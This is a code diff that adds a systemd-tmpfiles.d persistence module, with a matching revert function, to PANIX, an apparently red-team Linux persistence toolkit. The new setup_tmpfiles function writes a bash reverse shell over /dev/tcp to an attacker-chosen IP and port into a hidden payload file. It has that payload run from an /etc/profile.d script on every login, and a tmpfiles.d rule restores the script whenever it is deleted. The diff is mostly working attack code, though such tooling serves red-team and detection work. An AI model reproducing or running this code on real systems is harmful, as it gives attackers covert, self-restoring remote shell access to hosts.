@@ -35,6 +35,7 @@ usage_user() {
 	echo "  --shell-profile        Shell profile persistence"
 	echo "  --ssh-key              SSH key persistence"
 	echo "  --systemd              Systemd service persistence"
+	echo "  --tmpfiles             systemd-tmpfiles.d persistence"
 	echo "  --web-shell            Web shell persistence (PHP/Python)"
 	echo "  --xdg                  XDG autostart persistence"
 	echo "  --revert               Revert most changes made by PANIX' default options"
@@ -80,6 +81,7 @@ usage_root() {
 	echo "  --suid                 SUID persistence"
 	echo "  --system-binary        System binary persistence"
 	echo "  --systemd              Systemd service persistence"
+	echo "  --tmpfiles             systemd-tmpfiles.d persistence"
 	echo "  --udev                 Udev (driver) persistence"
 	echo "  --web-shell            Web shell persistence (PHP/Python)"
 	echo "  --xdg                  XDG autostart persistence"
@@ -127,6 +129,7 @@ revert_all() {
 		revert_suid
 		revert_system_binary
 		revert_systemd
+		revert_tmpfiles
 		revert_udev
 		revert_web_shell
 		revert_xdg
@@ -8085,6 +8088,211 @@ revert_systemd() {
     return 0
 }
 
+# Module: setup_tmpfiles.sh
+setup_tmpfiles() {
+	# systemd-tmpfiles.d persistence (issue #36).
+	# Drops a payload file and a tmpfiles.d unit that re-creates it on every
+	# boot / `systemd-tmpfiles --create` if the payload is deleted, giving the
+	# attacker a self-healing persistence primitive.
+	local payload_path=""
+	local tmpfiles_path=""
+	local conf_name=""
+	local command=""
+	local custom=0
+	local default=0
+	local ip=""
+	local port=""
+	local dest_path=""
+
+	usage_tmpfiles() {
+		echo "Usage: ./panix.sh --tmpfiles [OPTIONS]"
+		echo "--examples                   Display command examples"
+		echo "--default                    Use default tmpfiles settings"
+		echo "  --ip <ip>                    Specify IP address for the reverse shell payload"
+		echo "  --port <port>                Specify port number for the reverse shell payload"
+		echo "  --payload <path>            Path to the payload file that tmpfiles.d will re-create (default: /usr/local/lib/.cache/.payload)"
+		echo "  --dest <path>               Destination file re-created by tmpfiles.d (default: /etc/profile.d/panix-persist.sh)"
+		echo "  --conf <name>               tmpfiles.d config name (default: panix-persist.conf)"
+		echo "--custom                     Use custom tmpfiles settings"
+		echo "  --payload <path>            Path to the payload file that tmpfiles.d will re-create"
+		echo "  --dest <path>               Destination file re-created by tmpfiles.d"
+		echo "  --conf <name>               tmpfiles.d config name"
+		echo "  --command <command>         Custom persistence command written into the payload (no validation)"
+		echo "--help|-h                    Show this help message"
+	}
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			--payload )
+				shift
+				payload_path=$1
+				;;
+			--dest )
+				shift
+				dest_path=$1
+				;;
+			--conf )
+				shift
+				conf_name=$1
+				;;
+			--command )
+				shift
+				command=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "sudo ./panix.sh --tmpfiles --default --ip 10.10.10.10 --port 1337"
+				echo ""
+				echo "--custom:"
+				echo "sudo ./panix.sh --tmpfiles --custom --payload /tmp/evil.sh --dest /etc/profile.d/panix-persist.sh --conf panix-persist.conf"
+				exit 0
+				;;
+			--help|-h )
+				usage_tmpfiles
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --tmpfiles: $1"
+				echo "Try './panix.sh --tmpfiles --help' for more information."
+				exit 1
+				;;
+		esac
+		shift
+	done
+
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --tmpfiles --help' for more information."
+		exit 1
+	elif [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './panix.sh --tmpfiles --help' for more information."
+			exit 1
+		fi
+
+		if ! check_root; then
+			echo "Error: --tmpfiles requires root privileges (writes to /etc/tmpfiles.d)."
+			exit 1
+		fi
+
+		payload_path="${payload_path:-/usr/local/lib/.cache/.payload}"
+		dest_path="${dest_path:-/etc/profile.d/panix-persist.sh}"
+		conf_name="${conf_name:-panix-persist.conf}"
+
+		# The payload re-created by tmpfiles.d: a reverse shell sourced from a
+		# profile.d script so it triggers on any login shell.
+		mkdir -p "$(dirname "$payload_path")"
+		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" > "$payload_path"
+		chmod 755 "$payload_path"
+
+		# Destination file content (sourced by /etc/profile on login).
+		echo "# PANIX tmpfiles.d persistence" > "$dest_path"
+		echo "bash $payload_path" >> "$dest_path"
+		chmod 644 "$dest_path"
+
+		# tmpfiles.d rule: 'f' creates a regular file from the payload source
+		# whenever it is missing (self-healing persistence).
+		echo "f $dest_path 0644 root root - $payload_path" > "/etc/tmpfiles.d/$conf_name"
+		systemd-tmpfiles --create "/etc/tmpfiles.d/$conf_name" 2>/dev/null || true
+	elif [[ $custom -eq 1 ]]; then
+		if [[ -z $payload_path || -z $dest_path || -z $conf_name || -z $command ]]; then
+			echo "Error: --payload, --dest, --conf and --command must be specified when using --custom."
+			echo "Try './panix.sh --tmpfiles --help' for more information."
+			exit 1
+		fi
+
+		if ! check_root; then
+			echo "Error: --tmpfiles requires root privileges (writes to /etc/tmpfiles.d)."
+			exit 1
+		fi
+
+		mkdir -p "$(dirname "$payload_path")"
+		echo "$command" > "$payload_path"
+		chmod 755 "$payload_path"
+
+		echo "# PANIX tmpfiles.d persistence" > "$dest_path"
+		echo "bash $payload_path" >> "$dest_path"
+		chmod 644 "$dest_path"
+
+		echo "f $dest_path 0644 root root - $payload_path" > "/etc/tmpfiles.d/$conf_name"
+		systemd-tmpfiles --create "/etc/tmpfiles.d/$conf_name" 2>/dev/null || true
+	else
+		echo "Error: Either --default or --custom must be specified for --tmpfiles."
+		echo "Try './panix.sh --tmpfiles --help' for more information."
+		exit 1
+	fi
+
+	echo "[+] systemd-tmpfiles.d persistence established!"
+}
+
+# Revert Module: revert_tmpfiles.sh
+revert_tmpfiles() {
+	usage_revert_tmpfiles() {
+		echo "Usage: ./panix.sh --revert tmpfiles"
+		echo "Reverts any changes made by the setup_tmpfiles module."
+	}
+
+	if [[ "$(id -u)" -ne 0 ]]; then
+		echo "Error: --revert tmpfiles requires root privileges."
+		exit 1
+	fi
+
+	# Supported tmpfiles.d config names.
+	local confs=(
+		"/etc/tmpfiles.d/panix-persist.conf"
+		"/usr/lib/tmpfiles.d/panix-persist.conf"
+		"/run/tmpfiles.d/panix-persist.conf"
+	)
+
+	local removed=0
+	for conf in "${confs[@]}"; do
+		if [[ -f "$conf" ]]; then
+			# Parse the destination file path from the rule (2nd field).
+			local dest
+			dest=$(awk '{print $2}' "$conf")
+			local payload
+			payload=$(awk '{print $NF}' "$conf")
+
+			rm -f "$conf"
+			echo "[+] Removed tmpfiles.d config: $conf"
+
+			if [[ -n "$dest" && -f "$dest" ]]; then
+				rm -f "$dest"
+				echo "[+] Removed re-created file: $dest"
+			fi
+
+			if [[ -n "$payload" && -f "$payload" ]]; then
+				rm -f "$payload"
+				echo "[+] Removed payload: $payload"
+			fi
+
+			removed=1
+		fi
+	done
+
+	if [[ $removed -eq 0 ]]; then
+		echo "[-] No PANIX tmpfiles.d persistence found to revert."
+	else
+		echo "[+] systemd-tmpfiles.d persistence reverted!"
+	fi
+}
+
 # Module: setup_udev.sh
 setup_udev() {
 	local default=0
@@ -9285,6 +9493,11 @@ main() {
 				setup_systemd "$@"
 				exit
 				;;
+			--tmpfiles )
+				shift
+				setup_tmpfiles "$@"
+				exit
+				;;
 			--udev )
 				shift
 				setup_udev "$@"
@@ -9309,7 +9522,7 @@ main() {
 					echo "Example 2: ./panix.sh --revert all"
 					echo "Example 3: ./panix.sh --revert-all"
 					echo ""
-					echo "Modules: all, at, authorized-keys, backdoor-user, bind-shell, cap, create-user, cron, malicious-container, generator, git, initd, ld-preload, lkm, malicious-package, motd, package-manager, pam, passwd-user, password-change, rc-local, rootkit, shell-profile, ssh-key, sudoers, suid, system-binary, systemd, udev, xdg"
+					echo "Modules: all, at, authorized-keys, backdoor-user, bind-shell, cap, create-user, cron, malicious-container, generator, git, initd, ld-preload, lkm, malicious-package, motd, package-manager, pam, passwd-user, password-change, rc-local, rootkit, shell-profile, ssh-key, sudoers, suid, system-binary, systemd, tmpfiles, udev, xdg"
 					echo ""
 					exit 1
 				fi
